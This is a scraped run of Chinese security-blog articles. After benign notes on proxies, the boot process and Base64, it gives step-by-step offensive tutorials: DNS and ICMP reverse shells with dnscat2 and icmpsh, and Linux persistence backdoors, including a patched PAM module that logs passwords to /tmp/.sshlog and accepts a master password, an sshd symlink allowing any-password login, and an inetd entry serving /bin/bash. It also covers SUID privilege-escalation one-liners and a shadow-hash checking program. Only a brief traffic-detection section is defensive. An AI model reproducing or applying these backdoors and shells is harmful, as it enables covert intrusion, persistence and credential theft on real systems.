一般正常情况下，shell会将所有的信息返回回来，如果此时需要去除错误，只需要执行成功的信息，只需要将错误重定向到某个文件即可，我在DNS隧道反弹shell总结过，其中xxx 表示执行的代码，2表示错误 xxx 2 > error windows 和 Linux shell的转义符 写一个一句话 # windows echo ^ > test.php # Linux echo \"\" > test.php echo \\ > test.php windows、Linux 在终端中如何设置临时代理 临时代理设置如下 windows cmd shell set http_proxy=127.0.0.1:10809 set https_proxy=127.0.0.1:10809 powershell $env:HTTP_PROXY=\"127.0.0.1:10809\" $env:HTTPS_PROXY=\"127.0.0.1:10809\" Linux export http_proxy=127.0.0.1:10809 export https_proxy=127.0.0.1:10809 Linux 更新系统字体 首先下载tff文件 然后执行如下命令 sudo mkdir /usr/share/fonts/msyh sudo cp *.ttf /usr/share/fonts/msyh/ sudo fc-cache -fv JDK1.7 在macos版本的idea 运行警告 /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java \"-javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=63173:/Applications/IntelliJ IDEA.app/Contents/bin\" -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/htmlconverter.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-doclet.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/lib/tools.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes:/Users/aaronluo/.m2/repository/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections-3.1/commons-collections-3.1.jar:/Users/aaronluo/Documents/CodeReview/JavaCode/commons-collections4-4.0/commons-collections4-4.0.jar com.myproject.TestCC7 objc[20911]: Class JavaLaunchHelper is implemented in both /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/bin/java (0x1081794c0) and /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/libinstrument.dylib (0x10833f4e0). One of the two will be used. Which one is undefined. Process finished with exit code 0 该问题主要出现于 Mac 版本的 IntelliJ IDEA 之中，而引起该问题的原因，则是 Mac 中 JDK 的一个 BUG，如果你是jdk1.8.0_152之前的版本。它是由启动应用程序时 IDE 使用的 Java 代理触发的，此警告是无害的，我们可以安全地忽略，并且该问题已经在后续的 JDK 中得到了解决。 解决方式 既然该问题是由于 IDEA 启用代理引起的，那么我们禁止 IDEA 启动代理，即可解决该问题。 添加如下所示，并重启idea即可 idea.no.launcher=true 当然还可以升级JDK 到1.8.0_152+ MacOS docker 换源 安装好macos 下的docker 之后，直接点击Preferences，或者在桌面版点击齿轮图标，选中Docker Engine 修改如下 { \"debug\": true, \"experimental\": false, \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://hub-mirror.c.163.com\" ] } 最后点击右下角的apply & Restart 在命令行执行docker info命令就可以看到换好后的源 Kali 2019.4 换源之后，apt update 报错 root@kali:/usr# apt-get update 获取:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease [30.5 kB] 错误:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 已下载 30.5 kB，耗时 0秒 (32.6 kB/s) 正在读取软件包列表... 完成 W: 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository W: 无法下载 http://mirrors.ustc.edu.cn/kali/dists/kali-rolling/InRelease 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository 解决方案 从官网下载签名并安装 wget archive.kali.org/archive-key.asc apt-key add archive-key.asc Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:38:58 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html":{"url":"知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html","title":"02.计算机从加电到启动系统的过程（Linux）","keywords":"","body":" 简单过程 从加电到BIOS启动 第一步，加电引导寄存器置位 第二步，引导BIOS启动 相关知识学习 BIOS引导加载操作系统镜像 第一步，检查硬件 第二步，初始化硬件 第三步，搜索操作系统 Setup 函数引导内核 内核建立阶段 startup_32()函数 startup_32()函数 内核完善阶段start_kernel函数 简单过程 BIOS启动主动执行的固件，去认识第1个可启动设备 第一个可启动设备的第一个扇区的主引导块MBR，内含启动引导代码 bootloader（启动引导程序），读取内核文件来执行软件 内核文件启动操作系统 从加电到BIOS启动 第一步，加电引导寄存器置位 这个过程指，计算机加电之后，一个特殊电路会在CPU对应的针脚处产生一个逻辑电平，这个电平的值从针脚进入CPU，会引发寄存器（cs,eip）设置成特定值。 第二步，引导BIOS启动 这一过程指的是系统从物理地址0xfffffff0处加载一段程序到只读内存（ROM-> Read Only Memory），这个程序在80x86体系架构中一般称为BIOS 相关知识学习 MS-DOS的很多系统调用依赖BIOS Linux进入保护模式后不再依赖BIOS，BIOS只能以实模式运行。 实模式的寻址是20位总线寻址，支持的寻址空间为2^20，也就是1MB，保护模式目前在x86结构下，支持4GB寻址; 实际区别主要是EIP中的虚地址到实地址转化的区别： 实模式是seg(eip地址)*16+offset(4为偏移量)； 保护模式实EIP的16位地址代表页面位置，一个页在操作系统中都学习过是4KB，1M*4K = 4G，我相信很多人就此理解了为啥页的大小要设计成4K； BIOS引导加载操作系统镜像 第一步，检查硬件 一般可认为是开机加电自检，这个阶段会显示一些信息，包括BIOS版本这一类的信息 第二步，初始化硬件 主要是避免IRQ先与I/O冲突，本阶段最后会显示所有PCI（总线--内部硬件通信线路）设备信息 第三步，搜索操作系统 从软盘、网络、磁盘、CD-ROM的主引导扇区上搜索。找到后加载到扇区的内容到0x00007c00的位置（RAM中），跳转到这个地址，开始执行这段代码，这段程序叫做bootloader。 由于大小限制，linux的启动程序GRUB（GRand Unified BootLoader）或者是LILO（LInux LOader）被分为两部分。 第一部分就是加载到0x00007c00的这一段，他会把自己移动到0x00096a00的位置，建立实模式栈（0x00098000~0x000969ff） 第一部分吧第二部分加载到0x00096c00开始的位置中。 以上的位置都是在RAM中。 第二部分搜索磁盘上的OS景象，，把对应的扇区拷贝到RAM中执行： 1、首先把内核景象的第一个512B的部分从0x00090000处装入RAM中； 2、把setup()函数代码段装入0x00090200位置(RAM); 3、加载其他内核部分从高（0x00100000）或低（0x00010000）两个位置任选其一加载到RAM中，分别称为大映像内核和小映像内核； 4、跳转到setup函数执行； Setup 函数引导内核 这个过程主要是检查和初始化硬件、虽然BIOS完成了相似的大部分工作，但是因为不依赖与BIOS，所以，还是重新初始化了硬件方面的事情；重要的过程有： 移动低装载小映像内核的位置到0x00001000去，如果是高装载则不移动; 建立IDT（临时中断描述符表）和GDT（临时全局描述符表）； 如果需要，重置浮点单元（FPU）； 重新编写可编程终端控制器（PIC），屏蔽除IRQ2外的所有终端； 设置cr0寄存器到PE位，设置PG位为0，切换到保护模式，暂未启用分页； 跳转到startup_32()函数； 内核建立阶段 startup_32()函数 主要做的事如下： 初始化段寄存器和一个临时堆栈，并清零eflags寄存器所有为； 用0填充_edata 和_end符号标识的内核未初始化数据区； 调用decompress_kernel函数解压内核映像； 【低装载的情况解压内容放在0x00100000位置开始的RAM中，高装载的放在这后面的一个临时缓冲区内，解压后的内核就被移动到0x00100000位置】 跳转到0x00100000位置开始执行,新的执行点事arch/i386/kernerlhead.s中的另一个startup_32函数。 startup_32()函数 这个函数就是init进程(也就是pid = 0 的 0号进程)，主要做了以下工作 段寄存器初始化为最终值，内核的bss段填写为0； 初始化临时内核页表，初始化pg0，使得线性地址一律映射到统一的物理地址上； cr3寄存器保存了页全局目录，并设置cr0的pg位启用分页； 清零eflags，使用setup_idt函数用空的终端处理程序填充IDT； 从bios获取的数据（系统参数和传递给os的参数）放入页框1； 识别处理器、用GDT和IDT填充gdtr和idtr寄存器； 跳转到start_kernel函数内核完善阶段start_kernel函数 这一阶段最终完善了内核的初始化的后续工作，启动了程序调度、内存管理等操作系统的功能，其中就涉及到了著名的函数sched_init函数，至此，系统完全启动成功 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/02.计算机从加电到启动系统的过程（Linux）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/03.Base64编码解码原理.html":{"url":"知识库/03.主机安全/03.Base64编码解码原理.html","title":"03.Base64编码解码原理","keywords":"","body":" base64 索引表 编码 解码 参考文档 base64 编码是使用64个可打印的字符的ASCII字符（0-9、A-Z、a-z、+、\\）将任意字节序列数据编码成ascii码而成的一种算法，另有“=”符号用作后缀补位 base64 索引表 编码 ASCII码一共有256位(00000000-11111111)，因为1个字节有8bit，所以是8bit表示对应一个ASCII码 base64 编码，一共有64个可见字符，那么用二进制表示0-63，则是0 - (26 -1)=>000000-111111，所以对应的是6bit表示一个base64码 当ascii码转成base64码时，因为8和6的最小公倍数为24，24/8=3，24/6=4，表示每3个ascii码为1组，转换为4个base64码 abc => 01100001 01100010 01100011 011000 010110 001001 100011 => 24、22、9、35 YWJj 编码过程中，如果字符串不是3的倍数，那么就需要补位，就需要在后面添加=,如果8n mod 6 =2 那么需要补两个=，如果8n mod 6 = 4 需要补1个=，如果8n mod 6 = 0 则不需要=, (n为ascii码数量) abcd => 4*8 / 6 = 5 ...... 2 => 8*n mod 6 = 2 => 当余数=2的时候，要正常编码，bit数一定要为24的倍数，32+m = 24*n (n取最小值2) 所以需要补的bit数为48-32=16 => 需要补的16 位当中，已经有2位等待补0，那么按6bit一个base64码，需要补4位0，其余12位就补x（也就是两位=） 01100001 01100010 01100011 01100100 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx =>24、22、9、35、25、0、=、= YWJjZA== => 8n mod 6 = 4 的情况，8n = 16 n=2的时候，需要补2个00,然后再补6位x才满足16+8=24，可以被base64编码 ab => YWI= 所以记住 当8*n mod 6 = 2需要补16个bit，4个bit填充0，12个bit填充x，也就是两个= 8*n mod 6 = 4,需要补8个bit，其中2个bit填充0，6个填充x，也就是1个= mod运算在数论中学过，8n mod 6 这个等式等价于8 mod 6,在ascii 和 base64码相互转换，一定要满足待转换数的bit数为`24n` 解码 相信此时您已经了解了编码过程，那么对于解码来说就很简单了 编码过程中，是将3个字符编码成4个base64码，那么解码过程就是将4个base64码解码成3个ascii码（每8个bit一组，组合成一个ascii码） 对应如下： YWJj 011000 010110 001001 100011 01100001 01100010 01100011 => 97 98 99 abc 那么如果有=的该怎么计算对应的解码后的字符个数呢？ 如YMI=base64 编码的字符个数有4个，那么对应解码的字符个数为3个，又因为=为补位，需要减去，那么公式为n * 6 - 8 * m / 8 => (3 * n / 4)- m(化简后)（其中m为=个数，n 为base64码个数） 例：YWJjZA==解码后字符个数为 3 * 8 / 4 - 2 = 4 YWJjZA== 011000 010110 001001 100011 011001 00 0000 xxxxxx xxxxxx 01100001 01100010 01100011 01100100 (后面的0000 xxxxxx xxxxxx 为补位，在解码过程中需要去掉) => 97 98 99 100 abcd 所以记住，当解码base64码的时候： 当编码有1个= ，减去8个bit，如YMI=,(3 * n / 4) - m = 3*4/4-1 = 2 (n=4,m=1) 当编码有2个= ，减去16个bit，如YWJjZA==,(3*n / 4) -m = 3*8/4-2 = 4(n=8,m=2)参考文档 https://www.cnblogs.com/vege/p/12675562.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/03.Base64编码解码原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/04.DNS隧道反弹shell.html":{"url":"知识库/03.主机安全/04.DNS隧道反弹shell.html","title":"04.DNS隧道反弹shell","keywords":"","body":" DNS介绍 DNSCat2 工具介绍 DNSCat2 环境搭建 LInux 客户端搭建 Linux 服务端搭建 反弹shell 错误分析 流量检测 特征dnscat 域名特征 对比正常dns 解析流量包 项目地址：https://github.com/iagox86/dnscat2 DNS介绍 DNS是域名系统(Domain Name System)的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。 DNS的记录类型有很多，有A，AAAA,CNAME,MX,SOA,NS等。 DNS Tunneling可以利用其中的一些记录类型来传输数据。例如A，MX，CNAME,TXT，NULL等。 A记录：A记录是用来指定主机名对应的ip地址记录，简单的说A记录是指定域名对应的IP地址。 AAAA记录：记录将域名解析到一个指定的ipv6的ip上 CNAME记录，别名解析。可以将注册不同的域名解析到一个ip地址。 NS记录：域名服务器记录，用来指定该域名是由哪个DNS服务器进行解析。 MX记录:指向的是一个邮件服务器。 TXT记录：一般是指某个主机名或域名的说明 PTR记录：反向DNS DNS的解析过程可以分为两种类型：迭代查询和递归查询。通常本机到Local DNS Server的过程属于递归查询，而Local DNS Server对查询域名的解析过程属于迭代查询。为了减轻Local DNS Server的压力，提高解析速度，引入了缓存机制。缓存和TTL紧密相连，当TTL过期，Local DNS Server则会丢弃缓存的数据，重新从权威域名服务器上获取新的数据。 本地客户端---->Local DNS server---->根域服务器 Dns解析过程：系统发出dns解析之前会先看看本地是否保存了相关域名的解析，系统检测到hosts文件中没有响应的域名解析的时候会发送给本地dns解析服务器进行解析，解析之前会看看缓存中是否存在，如果没有，再将解析请求发给下一个dns服务器。结果返回后将该域名的解析结果保存到缓存中。 DNSCat2 工具介绍 Dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。 Dnscat2分为client端和server端，client运行在被控机器上，server运行在DNS服务器上。client，server部分分别是用C，ruby写的。其中作者在实现client部分时实现了跨平台，支持linux和windows编译运行。在完成连接建立后可以实现建立shell，上传下载文件等功能。 DNSCat2 环境搭建 LInux 客户端搭建 git clone https://github.com/iagox86/dnscat2 cd dnscat2/client/ make Linux 服务端搭建 # 有ruby 环境下 # 无ruby 环境 apt install ruby-full，我的ruby是2.7 cd dnscat2/server gem install bundler apt install ruby-dev bundler install 反弹shell 首先在服务端运行 # root 模式下 cd dnscat2/server ruby dnscat2.rb 然后在服务端banner信息中可以看到，如下所示的命令，在客户端处执行 cd dnscat2/client make ./dnscat --dns server=127.0.0.1,port=53 --secret=c229df179cba2226828cd03ff13859a4 在服务端执行 windows -a 进入会话 window -i 1 退出当前通道，进入shell suspend windows -a window -i 2 错误分析 地址被占用 netstat -ntlp # 关闭之后无法上网，这个是dns解析 systemctl stop systemd-resolved.service 运行服务端之后，一直告知warning: Capturing the given block using Kernel#proc is deprecated; use&blockinstead # 将错误重定向到指定文件即可 ruby dnscat2.rb 2> error 流量检测 在使用dnscat2 利用dns隧道进行反弹shell，那么作为防守方该如何检测呢？ 特征dnscat 首先在客户端处，会向恶意服务端发送dns请求，且会一直发送，包里都有相同的特征dnscat 域名特征 其次可以看到解析的域名很长，不符合正常域名 对比正常dns 解析流量包 正常dns域名解析包如下，通过对比可以发现dnscat2 的特征是非常明显的，正常包是不会有加密 [ ](https://github.com/iagox86/dnscat2) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:30 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/04.DNS隧道反弹shell.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/05.ICMP隧道反弹shell.html":{"url":"知识库/03.主机安全/05.ICMP隧道反弹shell.html","title":"05.ICMP隧道反弹shell","keywords":"","body":" 背景 ICMPSH 使用方法 条件 两个问题 项目地址：https://github.com/bdamele/icmpsh 背景 很多时候网络运维人员只会允许流量进入已知主机，端口和服务（在入口处过滤），当身处DMZ区域，通过TCP获取反向shell是不可能的，但是如果使用UDP（DNS隧道）或者icmp那么还是可以尝试 ICMPSH icmpsh是由python2 编写的，Linux 默认自带python2，但是无pip2，下载pip2()，然后下载项目(git clone ) // 下载pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py // 安装pip2，默认python 版本是python2 python get-pip.py // 下载项目 git clone https://github.com/bdamele/icmpsh 使用方法 条件 攻击机关闭icmp回应包 受害机能发送icmp包到攻击机 pip install impacket -i https://pypi.douban.com/simple // 首先在攻击机上关闭icmp回显 sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 其次，192.168.93.131是攻击机 python icmpsh_m.py 192.168.93.131 192.168.93.134 // 最后，在受害机执行 icmpsh.exe -t 192.168.93.131 两个问题 当前演示的环境是windows，那么受害机是Linux如何getshell ？ Linux 主机暂时未找到解决办法。。 为什么使用虚拟机（NAT模式下），主机作为受害者却始终不能getshell ？ 因为NAT模式是交换机NAT，从宿主机走出来的流量要先经过192.168.93.1 然后才能走到192.168.93.131(攻击机)，所以我们需要监听的是交换机的地址 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:35 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/05.ICMP隧道反弹shell.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/06.Linux权限维持.html":{"url":"知识库/03.主机安全/06.Linux权限维持.html","title":"06.Linux权限维持","keywords":"","body":" 背景 计划任务(Crontab) Authorized key 持久化 Open SSH 后门 SSH PAM 后门 SSH 软连接 后门 Vim 后门 alias 后门 inetd 后门 mafix 后门 背景 在拿到一台主机（Linux）的普通权限，或最高权限（uid=0），则要开始进行后渗透阶段，如果当Session断掉之后，能够迅速上线该主机，那么就需要维持该Session的权限了 计划任务(Crontab) Linux 中同步计划任务有如下： 系统级别的计划任务 /etc/crontab /etc/cron.*/ 用户级别的计划任务 /var/spool/corn/* 相对应的语法如下所示（这里以系统级别的计划任务举例） minute hour day month day of week user-name command to be executed 优点 缺点 无需编译，配置简单 易排查，设备上容易产生告警 Authorized key 持久化 攻击者在本地生成公私钥对 # 输入以下命令会在~/.ssh/目录下创建两个文件，分别是id_rsa,id_rsa.pub ssh-keygen -b 4096 -t rsa 在受害机已经获取权限的用户目录下执行 vi ~/.ssh/authorized_keys # 将刚刚生成的id_rsa.pub内容粘贴到authorized_keys文件中，如果该文件原来存在内容，就另起一行 chmod 600 ~/.ssh/authorized_keys chmod 700 ~/.ssh 使用自己的私钥登录该系统 如果只有一对公私钥可以不用指定私钥，ssh客户端在登录的时候会寻找/.ssh/id_rsa 优点 缺点 利用简单，攻击行为接近正常登录，一般不会触发告警 容易排查 Open SSH 后门 # 下载openssh-5.9p1.tar.gz openssh-5.9p1.patch.tar.gz tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.patch.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1 patch 修改include.h，默认将ssh登录该服务器的密码存储在/tmp/ilog 和 该服务器登录远程服务器的明文密码存储在/tmp/olog，SECRETPW 为 在受害机ssh登录服务器 使用apaajaboleh登录 优点 缺点 隐蔽性较强，攻击行为接近正常登录，不易触发其他告警。 需要编译环境，缺少GCC或其他依赖包容易出现问题，相对容易排查 SSH PAM 后门 PAM 是 Linux 默认的 SSH 认证登录机制，可以通过修改源码实现万能密码，记录登录密码等功能 # 首先查看PAM版本，需要有gcc编译环境 rpm -qa | grep pam tar zxvf Linux-PAM-1.1.8.tar.gz cd Linux-PAM-1.1.8 # 修改源码 vim modules/pam_unix/pam_unix_auth.c # 添加代码 if(strcmp(\"PAM\",p)==0){return PAM_SUCCESS;} if(retval == PAM_SUCCESS){ FILE * fp; fp = fopen(\"/tmp/.sshlog\", \"a\"); fprintf(fp, \"%s : %s\\n\", name, p); fclose(fp); } # 预编译 ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr # 编译，编译前可能会报错需要安装flex 和 flex-devel yum install flex flex-devel -y make 预编译 编译 # 编译完成之后，动态链接库在Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so # 查找系统原so文件默认存储在/usr/lib64/security/pam_unix.so find / -name pam_unix.so # 备份原pam文件和替换恶意pam文件 mv /usr/lib64/security/pam_unix.so /usr/lib64/security/pam_unix.so.bak mv /home/aaron/Desktop/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so 使用正常密码登录，可以在/tmp/.sshlog文件找到登录密码，使用我们留的密码（PAM）登录也可以 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易排查，需要编译环境 SSH 软连接 后门 # 通过软连接建立一个ssh后门 ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345 原理： Linux软连接ssh后门，通过PAM认证方式登录 将sshd文件软连接名称设置为su ,实质上PAM认证是通过软连接的文件名(如:/usr/local/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如:/etc/pam.d/su) 任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆 建立软连接到/usr/local/su 文件，也可以在其他目录，su文件名字不能变，变了就无法登录。当然可以通过其他设置，更改su名字也是可以的。然后启动，并指定监听12345端口，登录的时候密码随意即可，登录如下： 使用root/任意密码即可登录成功 优点 缺点 攻击行为接近正常登录，不会触发其他告警 容易被排查 Vim 后门 修改/etc/vimrc 或者/etc/.vimrc，每次启动vim 执行恶意脚本，vim 支持python，构建python 反弹shell vim /etc/vimrc 优点 缺点 利用简单 持久化效果一般，易暴露 alias 后门 alias 是Linux的命令的别名，存储在~/.bashrc(这里只讨论bash shell)中，修改之后再使用命令，当再使用ls时，就会反弹shell source ~/.bashrc 优点 缺点 利用简单 容易被发现，持久化效果一般 inetd 后门 通俗来讲就是一个监听外部网络请求 [就是一个socket] 的系统守护进程,其实有很多比较古老的服务都是基于此守护进程 # 安装inetd apt install openbsd-inetd # 可以直接用service中定义好的服务，只需要把实际的处理程序替换下即可 vim /etc/services fido 60179/tcp # fidonet EMSI over TCP # 配置inetd.conf 并启动inetd vim /etc/inetd.conf fido stream tcp nowait root /bin/bash -i # 当外部请求为fido的服务时，就反弹一个交互式的shell systemctl restart inetd nc -vv [host] [port] 优点 缺点 利用简单 有反连shell告警 mafix 后门 下载地址：https://github.com/yzimhao/godpock/tree/master/Rootkit tar zxvf mafix.tar.gz cd mafix.tar.gz ./root 密码 端口 # 攻击机 使用如下命令 # centos 7 还支持ssh1，windows，Debian、Ubuntu ssh客户端不支持ssh1 ssh -1 root@xxx.xxx.xxx.xxx -p port 优点 缺点 无需编译，配置简单 会替换ls等命令，容易被识破 环境依赖较高，在Ubuntu，centos上测试不通过，Ubuntu缺少依赖，centos会死机，在Debian上顺利通过 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:39:21 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/06.Linux权限维持.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/07.Linux_SUID提权原理.html":{"url":"知识库/03.主机安全/07.Linux_SUID提权原理.html","title":"07.Linux_SUID提权原理","keywords":"","body":" 基本原理 原理验证 实战利用 问题思考 bash shell 不是以root启动 使用root启动python，但是用户还是低权限用户 基本原理 chmod命令可以改变文件或者路径的一些权限属性。在chmod的众多参数中，有一个s参数引发了一个重大的问题。s参数的含义是允许程序临时以所有者权限运行。其使用命令如下： #chmod +s targetfile chmod +s ./exp 原理验证 编写如下代码 persist.c #include #include #include int main(){ setuid(0); system(\"cat /etc/shadow\") return 0; } 在root权限下编译 gcc persist.c -o persist 在普通用户权限下执行 在root用户下添加s权限，并在普通用户下执行 实战利用 可常用命令如下 nmap --interactive \\ !sh find . -type f -exec /bin/bash ; awk 'BEGIN {system(\"/bin/bash\")}' strace -o/dev/null /bin/bash 寻找本机器环境下的s属性程序 find / -perm -u=s -type f 2>/dev/null 使用find提权 问题思考 在这里很疑惑两点 bash shell 不是以root启动 find 提权使用bash shell 命令是以root 启动，但是给的bash shell 启动权限是低权限用户 使用root启动python，但是用户还是低权限用户 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-25 10:36:07 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/07.Linux_SUID提权原理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html":{"url":"知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html","title":"08.Linux的账号口令机制及其爆破","keywords":"","body":" 账号保存 /ect/passwd /ect/shadow 认证流程 破解方式 原理介绍 Test 账号保存 谈到linux的账号认证，其实就是如何保存于通过口令(password)鉴别，这里首先要讲两个文件，一个是/etc/passwd，另外一个是/etc/shadow文件 我们先来看/etc/passwd 文件 /ect/passwd 我们来解释一下这张图片，说明一下/etc/passwd文件的格式：用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell，我们来说几个重点字段 口令： 因为安全问题，放在/etc/shadow中去了 用户标识号：uid 组标识号：gid 主目录：用户主目录 登录shell：当为nologin的时候其实是无法登录的 /ect/shadow 我们来解释一下这张图片，说明一下/etc/shadow文件的格式：用户名:$加密方式$盐字符串$密文口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志，我们来说几个重点字段。 加密方式：6->sha-512加密，1->md5加密，2->Blowfish加密，5->sha-256加密 盐：加盐对抗破解的那个随机字符串 密文口令：和盐一起经过f(password,key)运算后得到的值认证流程 linxu引导启动后，会读取前文介绍的两个文件，读取到内存中，存入两个数据结构中（passwd结构和spwd结构），使用linux自身的函数获取用户名和密码，对密码进行运算后进行比较。从数学公式来讲，如下： value = f(InputPasswd,SaltString) 然后比较这个value的值与/etc/shadow中的值保存的是否一致。破解方式 原理介绍 ```cinclude include include include const char value = \"\";//这里是/etc/shadow中的hash值 const char password = \"\";//明文密码 const char salt = \"\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[]Shadow-Hash-Value: %s\\n\",value); printf(\"[]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[]Find-Password:%s\\n\", password); } return 0; } #### Test ```c # gcc a.c -lcrypt -o a #include #include #include #include const char *value = \"$6$Z0f28R2x$SkbWn/jFsxjQhHIijkLq6o1xIcvktjwABR5Gtfmx8L7zv******************.\";//这里是/etc/shadow中的hash值 const char *password = \"xx\";//明文密码 const char *salt = \"$6$Z0f28R2x$\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[*]Shadow-Hash-Value: %s\\n\",value); printf(\"[*]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[*]Find-Password:%s\\n\", password); } return 0; } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:37 Author: aaron Url: 